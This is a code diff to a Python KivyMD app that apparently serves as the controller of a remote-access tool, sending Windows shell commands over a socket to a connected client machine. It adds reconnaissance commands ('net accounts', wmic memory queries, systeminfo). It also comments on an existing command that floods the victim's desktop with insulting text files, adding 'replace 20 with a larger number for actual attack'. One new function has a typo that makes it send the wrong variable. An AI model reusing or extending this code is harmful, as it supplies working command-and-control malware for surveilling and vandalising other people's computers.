@@ -139,6 +139,14 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.OpenBrowser()
+                
+            MDRectangleFlatButton:
+                id: availMem
+                text: "Available Memory"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.MemoryAvail()    
 '''
 
 class Main(MDApp):
@@ -264,6 +272,43 @@ class Main(MDApp):
             print('Output: ', output)
             self.root.ids.consoleField.text = output
             break
+            
+    #Get security policy        
+    def SecPolicy(self):
+        while True:
+            #reset console
+            self.root.ids.consoleField.text = ''
+            command = 'net accounts'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            output = self.currConn.recv(8096).decode()
+            print('Output: ', output)
+            self.root.ids.consoleField.text = output
+            break
+            
+    #Get memory status
+    def MemoryStatus(self):
+        while True:
+            #reset console
+            self.root.ids.consoleField.text = ''
+            command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            output = self.currConn.recv(8096).decode()
+            print('Output: ', output)
+            self.root.ids.consoleField.text = output
+            break
+            
+    def MemoryAvail(self):
+        while True:
+            self.root.ids.consoleField.text = ''
+            commmand = 'systeminfo | find "Available Physical Memory"'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            output = self.currConn.recv(8096).decode()
+            print('Output: ', output)
+            self.root.ids.consoleField.text = output
+            break
 
     # Fang's stuffz
     def UserInfo(self):
@@ -335,7 +380,7 @@ class Main(MDApp):
         while True:
             #Reset console
             self.root.ids.consoleField.text = ''
-            
+            #replace 20 with a larger number for actual attack
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
